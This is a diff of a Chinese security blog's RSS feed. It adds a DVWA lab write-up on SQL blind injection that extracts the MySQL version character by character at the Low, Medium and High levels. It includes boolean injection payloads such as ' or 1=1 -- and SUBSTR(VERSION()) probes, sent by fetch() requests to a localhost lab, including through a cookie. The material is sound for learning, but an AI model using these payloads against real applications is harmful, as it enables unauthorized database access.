@@ -1,4 +1,209 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>security on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/security/</link><description>Recent content in security on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 27 Apr 2022 15:43:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/security/index.xml" rel="self" type="application/rss+xml"/><item><title>DVWA上手记录-SQL注入</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-06/</link><pubDate>Wed, 27 Apr 2022 15:43:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-06/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>security on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/security/</link><description>Recent content in security on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Thu, 28 Apr 2022 11:30:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/security/index.xml" rel="self" type="application/rss+xml"/><item><title>DVWA上手记录-SQL盲注</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-07/</link><pubDate>Thu, 28 Apr 2022 11:30:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-07/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>SQL盲注会比一般的注入难度高很多，特别是经验不足的时候可以尝试的 payload 有限，就算有注入点也很难靠手里积累的那点 payload 测出来。一般这种时候用工具会好得多。&lt;/p>
+&lt;h2 id="原理">原理&lt;/h2>
+&lt;p>SQL盲注指的是存在SQL注入，但SQL错误不回显。这种情况下报错攻击无效而且构造有效的 payload 会比较困难。但还是可以通过几个方面确定执行结果：&lt;/p>
+&lt;ol>
+&lt;li>页面显示内容。比如当SQL错误发生或&lt;code>WHERE&lt;/code>、&lt;code>ON&lt;/code>这样的条件子句不满足时和正常执行时网页内容不同。&lt;/li>
+&lt;li>如果正常执行和错误都返回一样的页面，还可以通过时间来判断SQL是否被执行，比如构造一个执行很慢的 payload 让 SQL 服务器跑，如果返回时间比正常时间久就说明SQL被执行了。&lt;/li>
+&lt;li>可能还有其他的？&lt;/li>
+&lt;/ol>
+&lt;p>盲注还有个问题就是注入的查询可能不回显到前端，所以直接 &lt;code>UNION&lt;/code> 一个查询曝出所有的表和列是不太可能的。但如果存在盲注的话至少会有一个比特的观测窗口，所以还是存在一个字符一个字符试过去的办法，比如表名第一个字符是&lt;code>a&lt;/code>的表是否存在，表名第一个字符是&lt;code>b&lt;/code>的表是否存在，如此如此。虽然慢而且对一些无法枚举的字段（比如存的是unicode，那总不能遍历整个码表；或者 &lt;code>int&lt;/code>、&lt;code>float&lt;/code>这样取值范围太大的类型）没辙。&lt;/p>
+&lt;h2 id="解题">解题&lt;/h2>
+&lt;h3 id="low难度收集信息">Low难度：收集信息&lt;/h3>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165553250.png"
+width="680"
+height="263"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165553250_hu68e498a1133389b005a60b1455865bff_21821_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165553250_hu68e498a1133389b005a60b1455865bff_21821_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220427165553250"
+class="gallery-image"
+data-flex-grow="258"
+data-flex-basis="620px"
+>&lt;/p>
+&lt;p>一个普通表单，尝试输入数字。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165613795.png"
+width="308"
+height="116"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165613795_hu7dd84795174df6ca381a743739fa4e6f_2858_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165613795_hu7dd84795174df6ca381a743739fa4e6f_2858_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220427165613795"
+class="gallery-image"
+data-flex-grow="265"
+data-flex-basis="637px"
+>&lt;/p>
+&lt;p>逻辑应该是检测这个用户id是否存在于数据库中，随便乱打个数字看看。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165723361.png"
+width="631"
+height="280"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165723361_hud0ddf149c67d609f3993862f6211fe66_22979_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165723361_hud0ddf149c67d609f3993862f6211fe66_22979_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220427165723361"
+class="gallery-image"
+data-flex-grow="225"
+data-flex-basis="540px"
+>&lt;/p>
+&lt;p>看下目标是什么。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165744902.png"
+width="455"
+height="90"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165744902_hu54a233f6dacf4b2d5441110f27ac7522_3798_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165744902_hu54a233f6dacf4b2d5441110f27ac7522_3798_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220427165744902"
+class="gallery-image"
+data-flex-grow="505"
+data-flex-basis="1213px"
+>&lt;/p>
+&lt;p>猜解数据库版本。接着试一试是什么类型的注入，已知这个表单回显是存在/不存在，所以拼一个 &lt;code>' or 1=1; --&lt;/code> 看看，把条件变成恒真。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165955690.png"
+width="503"
+height="157"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165955690_hud319f5e9c130be7012bdc27ceda0d782_8803_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220427165955690_hud319f5e9c130be7012bdc27ceda0d782_8803_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220427165955690"
+class="gallery-image"
+data-flex-grow="320"
+data-flex-basis="768px"
+>&lt;/p>
+&lt;p>有效。&lt;/p>
+&lt;h3 id="low难度解题">Low难度：解题&lt;/h3>
+&lt;p>用 &lt;code>or&lt;/code> 连接一个子查询，&lt;code>SELECT EXISTS(SELECT * FROM sys.version WHERE mysql_version LIKE '5%'); --&lt;/code>。这个查询会判断是MySQL的版本是不是5开头。依次类推很快就能解出MySQL版本号。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&amp;#39; or (SELECT EXISTS(SELECT * FROM sys.version WHERE mysql_version LIKE &amp;#39;5%&amp;#39;)); --
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是很快发现行不通，因为没有权限访问 &lt;code>sys&lt;/code> 这个系统库（没有报错，我只能猜是这样）。&lt;/p>
+&lt;p>想了想再谷歌了一下盲注的payloads之后还行没什么头绪，&lt;code>union&lt;/code>大概是不行的，因为回显只有exists和missing两种状态，union查出来也看不到。再翻了一下怎么用SQL查询MySQL版本之后发现除了&lt;code>show variables&lt;/code>和&lt;code>sys.version&lt;/code>之外，还可以试试&lt;code>version&lt;/code>函数。用&lt;code>SELECT SUBSTR(VERSION(),1,1)='5'&lt;/code>，然后逐个位判断（最好是先判断出这个字符串长度，用&lt;code>length(version())&amp;gt;1&lt;/code>这样的 payload。）&lt;/p>
+&lt;p>于是做出下面一系列payload（mysql版本号是&lt;code>x.y.z&lt;/code>格式，肯定不低于5位，直接从5开始判断）。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&amp;#39; or (SELECT LENGTH(VERSION())&amp;gt;5); -- true
+&amp;#39; or (SELECT LENGTH(VERSION())&amp;gt;6); -- false
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>只用了两个 payload 就确定了长度是 6。&lt;/p>
+&lt;p>接着判断第一位是不是5（因为5.x还是最常用的MySQL版本），后面逐位判断。（这里略了尝试的部分）&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&amp;#39; or (SELECT SUBSTR(VERSION(),1,1)=&amp;#39;5&amp;#39;); -- true
+&amp;#39; or (SELECT SUBSTR(VERSION(),2,1)=&amp;#39;.&amp;#39;); -- true
+&amp;#39; or (SELECT SUBSTR(VERSION(),3,1)=&amp;#39;7&amp;#39;); -- true
+&amp;#39; or (SELECT SUBSTR(VERSION(),4,1)=&amp;#39;.&amp;#39;); -- true
+&amp;#39; or (SELECT SUBSTR(VERSION(),5,1)=&amp;#39;3&amp;#39;); -- true
+&amp;#39; or (SELECT SUBSTR(VERSION(),6,1)=&amp;#39;7&amp;#39;); -- true
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以数据库版本号是 &lt;code>5.7.37&lt;/code>。&lt;/p>
+&lt;p>这种无聊的爆破工作显然是应该交给脚本的。之后研究sqlmap的时候会再回头看看怎么用sqlmap盲注这里。&lt;/p>
+&lt;h3 id="medium难度收集信息">Medium难度：收集信息&lt;/h3>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092639212.png"
+width="676"
+height="262"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092639212_hudf0870afea0dcfc1e3e4109bbd719b87_21982_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092639212_hudf0870afea0dcfc1e3e4109bbd719b87_21982_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220428092639212"
+class="gallery-image"
+data-flex-grow="258"
+data-flex-basis="619px"
+>&lt;/p>
+&lt;p>和SQL注入题的medium难度一模一样。&lt;/p>
+&lt;h3 id="medium难度解题">Medium难度：解题&lt;/h3>
+&lt;p>还是老样子，复制出请求，尝试提交个数字型注入。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli_blind/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="s2">&amp;#34;accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;accept-language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;cache-control&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;content-type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;pragma&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-ch-ua&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34; Not A;Brand\&amp;#34;;v=\&amp;#34;99\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;100\&amp;#34;, \&amp;#34;Microsoft Edge\&amp;#34;;v=\&amp;#34;100\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-ch-ua-mobile&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-ch-ua-platform&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34;Windows\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-fetch-dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-fetch-mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-fetch-site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-fetch-user&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;upgrade-insecure-requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>
+&lt;span class="p">},&lt;/span>
+&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli_blind/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;referrerPolicy&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;strict-origin-when-cross-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;id=999+or+1%3D1;+--+&amp;amp;Submit=Submit&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>
+&lt;span class="p">});&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092945875.png"
+width="275"
+height="127"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092945875_hue3004388d8f7ebb1b8e1a4e7c063a876_6853_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428092945875_hue3004388d8f7ebb1b8e1a4e7c063a876_6853_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220428092945875"
+class="gallery-image"
+data-flex-grow="216"
+data-flex-basis="519px"
+>&lt;/p>
+&lt;p>在&lt;code>id=999 or 1=1; --&lt;/code>这个payload下返回了 &lt;code>exists&lt;/code>，剩下的就是和 Low 难度差不多的方式爆破出版本号，就不复述了。&lt;/p>
+&lt;h3 id="high难度收集信息">High难度：收集信息&lt;/h3>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093304965.png"
+width="322"
+height="226"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093304965_hua6d17fe928e830e032cdd493fe5241e6_10316_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093304965_hua6d17fe928e830e032cdd493fe5241e6_10316_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220428093304965"
+class="gallery-image"
+data-flex-grow="142"
+data-flex-basis="341px"
+>&lt;/p>
+&lt;p>和SQL注入题的High难度差不多，但注意到题中提示变成了 &lt;code>Cookie ID set!&lt;/code>，于是看一眼 Cookie。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093423840.png"
+width="462"
+height="57"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093423840_huafac5c1c1ab8d99e6aa0d3cebbb5bbd0_4571_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428093423840_huafac5c1c1ab8d99e6aa0d3cebbb5bbd0_4571_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220428093423840"
+class="gallery-image"
+data-flex-grow="810"
+data-flex-basis="1945px"
+>&lt;/p>
+&lt;p>id直接保存在cookies里，这就简单多了。&lt;/p>
+&lt;h3 id="high难度解题">High难度：解题&lt;/h3>
+&lt;p>复制出请求（注意复制出 NodeJS fetch，复制浏览器 fetch 不会复制出cookie），把cookie里的id改成&lt;code>0 or 1=1 --&lt;/code>，URL编码。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">let&lt;/span> &lt;span class="nx">resp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli_blind/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="s2">&amp;#34;accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;accept-language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;cache-control&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;pragma&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;no-cache&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-ch-ua&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34; Not A;Brand\&amp;#34;;v=\&amp;#34;99\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;100\&amp;#34;, \&amp;#34;Microsoft Edge\&amp;#34;;v=\&amp;#34;100\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-ch-ua-mobile&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-ch-ua-platform&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34;Windows\&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-fetch-dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-fetch-mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;sec-fetch-site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;upgrade-insecure-requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;cookie&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;id=0 or 1=1 -- ; PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=high&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;Referer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/sqli_blind/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;Referrer-Policy&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;strict-origin-when-cross-origin&amp;#34;&lt;/span>
+&lt;span class="p">},&lt;/span>
+&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;GET&amp;#34;&lt;/span>
+&lt;span class="p">});&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>初始化一个node包（&lt;code>package.json&lt;/code>把&lt;code>type&lt;/code>设置成&lt;code>module&lt;/code>），安装&lt;code>node-fetch&lt;/code>，补个 &lt;code>import fetch from &amp;quot;node-fetch&amp;quot;;&lt;/code> 然后调试上面的脚本，发现提示 MISSING。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095318913.png"
+width="398"
+height="74"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095318913_huf62e30a3957d9ddbae2f6500df0b0dd5_6114_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095318913_huf62e30a3957d9ddbae2f6500df0b0dd5_6114_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220428095318913"
+class="gallery-image"
+data-flex-grow="537"
+data-flex-basis="1290px"
+>&lt;/p>
+&lt;p>难道是字符型注入？改成&lt;code>' or 1=1 --&lt;/code>再试一次。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095720005.png"
+width="381"
+height="67"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095720005_hu206a8a9164fccec6065813bd0974fd58_8234_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-07/image-20220428095720005_hu206a8a9164fccec6065813bd0974fd58_8234_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220428095720005"
+class="gallery-image"
+data-flex-grow="568"
+data-flex-basis="1364px"
+>&lt;/p>
+&lt;p>这次提示变成了exists，所以是字符型注入。接下来就是用 Low 难度的 Payload 一个一个试过去，爆破出版本号。&lt;/p>
+&lt;h2 id="总结">总结&lt;/h2>
+&lt;p>说说我打完盲注的想法。其实最大的问题是没信心，不知道到底什么结果，没有任何错误提示。有源码的情况下白盒还比较容易构造 payload，黑盒的情况下盲注构造payload倒是很考验心态，因为总是不成功没反应打击很大，会怀疑是不是自己判断错了。&lt;/p>
+&lt;p>而且很费时间。&lt;/p>
+&lt;p>想确认是否有注入点感觉最好的办法还是先拿工具脚本试水。不过有防火墙的情况下可能又有问题=。=像是&lt;code>or 1=1&lt;/code>这种payload很可能被杀。工具没辙的时候还得看人有没有新点子，但这又是大佬的领域了&amp;hellip;&lt;/p>
+&lt;p>嗯，我也想做大佬啊。&lt;/p></description></item><item><title>DVWA上手记录-SQL注入</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-06/</link><pubDate>Wed, 27 Apr 2022 15:43:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-06/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
 &lt;p>SQL注入，比较熟悉的名字。看看 DVWA 里能怎么玩吧。&lt;/p>
 &lt;h2 id="原理">原理&lt;/h2>
 &lt;p>拼字符串，和命令注入原理一样。&lt;/p>
